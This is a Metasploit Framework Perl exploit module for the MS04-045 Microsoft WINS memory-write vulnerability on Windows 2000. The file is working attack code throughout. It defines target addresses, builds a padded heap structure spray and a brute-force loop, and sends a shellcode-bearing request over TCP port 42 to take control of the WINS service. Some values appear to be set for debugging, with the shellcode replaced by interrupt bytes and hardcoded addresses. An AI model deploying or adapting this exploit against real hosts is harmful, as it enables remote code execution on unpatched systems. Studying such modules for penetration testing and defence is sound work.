
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::wins_ms04_045;
use base "Msf::Exploit";
use Pex::DCERPC;
use strict;
use Pex::Utils;
use Pex::Text;

my $advanced = 
{
	'BASE'	=> [0, 'Specify the exact address to the structure'],
	'TARG'	=> [0, 'Specify the exact address to overwrite'],
	'WHAT'	=> [0, 'Specify the data used to overwrite the address'],
	'INT3'	=> [0, 'Switch to a payload of x86 debug interrupts'],
};

my $info =
{
    'Name'  => 'Microsoft WINS MSO4-045 Code Execution',
    'Version'  => '$Revision$',
    'Authors' => [ 'H D Moore <hdm [at] metasploit.com>' ],
    'Arch'  => [ 'x86' ],
    'OS'    => [ 'win32', 'win2000' ],
    'Priv'  => 1,
    'AutoOpts'  => { 'EXITFUNC' => 'thread' },
    'UserOpts'  => {
                    'RHOST'  => [1, 'ADDR', 'The target address'],
                    'RPORT'  => [1, 'PORT', 'The target port', 42],
                },

    'Payload' => {
                     'Space'  => 3000,
                     'BadChars'  => '',
					 'Keys'      => ['+ws2ord'],						 
                 },
    
    'Description'  => Pex::Text::Freeform(qq{
        This module exploits a arbitrary memory write flaw in the WINS service, this vulnerability
        was originally found by Immunity.
    }),
                
    'Refs'  =>   [  
                 #   ['OSVDB',   5248],
                    ['MSB',     'MS04-045'],
                 ],
    'Targets'   =>
                 [
                   ['Windows 2000 Stack Brute 0', 0x05391e80, 0x0580f500, 0x0580e000 ],
				   ['Windows 2000 Stack Brute 1', 0x05391e80, 0x053df500, 0x053df000 ],
                   ['Windows 2000 Func Brute' , 0x05391e80,  0x1025500,  0x1023000 ],
                   ['Windows 2000 SP1 Func'   , 0x05391e80,  0x102537c,  0x102537c ],				   
				   ['Windows 2000 SP0 WS2'   , 0x05391e80,  0x750417ac,  0x750417ac ],
                   ['Windows 2000 SP1 WS2'   , 0x05391e80,  0x750417c4,  0x750417c4 ],
				   ['Windows 2000 SP2 WS2'   , 0x05391e80,  0x750407c4,  0x750407c4 ],
                 ],
    'Keys'  =>  ['wins'],                 
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}


sub Replicate {
	my $self = shift;
	my $targ = shift;
	my $what = shift;

	# write targ, what, what, what to targ
	my $data = pack('N10',
		0x41414141,
		$targ - 0x48,
		$what,
		$what,
		$what,
		0x42424242,
		0x43434343,
		0x44444444,
		0x45454545,
		0x46464646,
	);
	
	return $data;
}


sub Exploit {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $target_idx  = $self->GetVar('TARGET');
    my $target_name = $self->GetVar('NBNAME');
    
    my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
    
    my $target = $self->Targets->[$target_idx];
   
    if (! $self->InitNops(128)) {
	    $self->PrintLine("[*] Failed to initialize the nop module.");
		return;
	}
	
	my $req;

	my $base = $target->[1];
	my $addb = $target->[2];
	my $adde = $target->[3];
	
	my $boom = $base + 45000;

	$shellcode = "\xcc" x length($shellcode);

	printf("Shellcode at 0x%.8x\n", $boom);
	$base = 0x05391ea0;
	$addb = 0x414142f0;
	$adde = 0x41414000;

	# Each valid base pointer, but invalid structure, results in a new structure
	# being added to the base pointer. These structures are 40 bytes long. 
	# Our brute force is limited to padding + fuzz / 40 bytes
	
	# We can guarantee that our data will always be aligned at 40 byte boundaries,
	# so we generate a set of structures that wrap into each other and will always
	# have (40 * count) + 4 pointing to the where pointer. Since 40 bytes after the
	# where pointer is another where, we write to where -4 and only place 12 bytes
	# of data into the target address instead of 16. If we write in 12 byte sets
	# we can completely cover an area (except the 4 bytes before it) with pointers
	# to our shellcode.
	
	##
	# Step 1
	# ======
	#
	# Pad the beginning of the request with 200 40-byte structures with benign data.
	# This will let us attack a server that has already had the base address grown
	# by up to 100 structures.
	#
	##
	
	# Prevent the base from growing by using a valid address
	# 0x20000 = global process information segment
	$req = $self->Replicate(0x00020fe4 - 4, unpack('N', 'MSF!')) x 200;
	
	# This should always point at the first where address in the padding buffer
	my $brute_base = $base + (100 * 40) + 4;

	$self->PrintLine(sprintf("[*] The brute force base address is 0x%.8x", $brute_base));
		
	##
	# Step 2
	# ======
	#
	# Assume that our data starts at BASE + 100 * 40. This should always be the case
	# as long less than 100 exceptions have already occured in the wins.exe process.
	# Create structures that will iterate thorugh all of the target addreses. We will
	# later scan through these structures with additional requests.
	#
	##	
	
	# Iterate through all target addresses, adding a structure to the request for
	# each one of them. Since the first four bytes of the target address will be
	# overwritten by the next target address, we will write to four byte before the
	# target and only increment by 12 byte chunks. 
	
	for (my $targ = $addb; $targ > $adde; $targ -= 12) {
		$req .= $self->Replicate($targ - 4, $boom);
	}


	##
	# Step 3
	# ======
	#
	# Determine how much space is left to fill between the brute force structures and
	# the beginning of the payload itself. Fill in this data and then append as many
	# bytes of nops as we account for in padding structures. Finally, append our 
	# paylaod to the end of these nops.
	#
	##		

	my $diff = 45000 - length($req);

	if ($diff <= 0) {
		$self->PrintLine("[*] Internal error, brute force buffer is too large.");
		return;
	}
	
	$req .= "\xff" x $diff;
	$req .= $self->MakeNops(100 * 40);
	$req .= $shellcode;
	
	
	
	##
	# Step 4
	# ======
	#
	# Place our request into memory, using an invalid structure pointer.
	#
	##		
	
	my $pkt = pack('NNN', length($req) - 8, -1, 0xdeadface). $req;
	$self->PrintLine("[*] Initializing the attack...");
	my $s = Msf::Socket::Tcp->new
    (
        'PeerAddr'  => $target_host,
        'PeerPort'  => $target_port,
    );

    if ($s->IsError) {
        $self->PrintLine("[*] Socket error: " . $s->GetError());
        return(0);
    }

	$s->Send($pkt);



	##
	# Step 5
	# ======
	#
	# Brute force through our structure list, starting at the heap base plus the padding
	# offset, plus 4. Increment this pointer by 40 bytes until we run out of addresses
	# or we get a shell. 
	#
	##		
		
	my $brute = $brute_base;
	
	for (my $targ = $addb; $targ > $adde; $targ -= 12) {

		my $pkt = pack('NNN', 8, -1, $brute);
		
		$self->PrintLine(sprintf("[*] Trying target address 0x%.8x with structure at 0x%.8x...", $targ, $brute));

		my $s = Msf::Socket::Tcp->new
    	(
        	'PeerAddr'  => $target_host,
        	'PeerPort'  => $target_port,
    	);

    	if ($s->IsError) {
        	$self->PrintLine("[*] Socket error: " . $s->GetError());
        	sleep(2);
			next;
    	}

		$s->Send($pkt);	
		
		$brute += 4;
	}
	
	$self->PrintLine("[*] Unable to exploit target");
	return;
}


1;


__END__


[X, W, S, S, S, S, X, X, X, X]
[X, W, S, S, S, S, X, X, X, X]
[X, W, S, S, S, S, X, X, X, X]
[X, W, S, S, S, S, X, X, X, X]
[X, W, S, S, S, S, X, X, X, X]
[X, W, S, S, S, S, X, X, X, X]
[X, W, S, S, S, S, X, X, X, X]
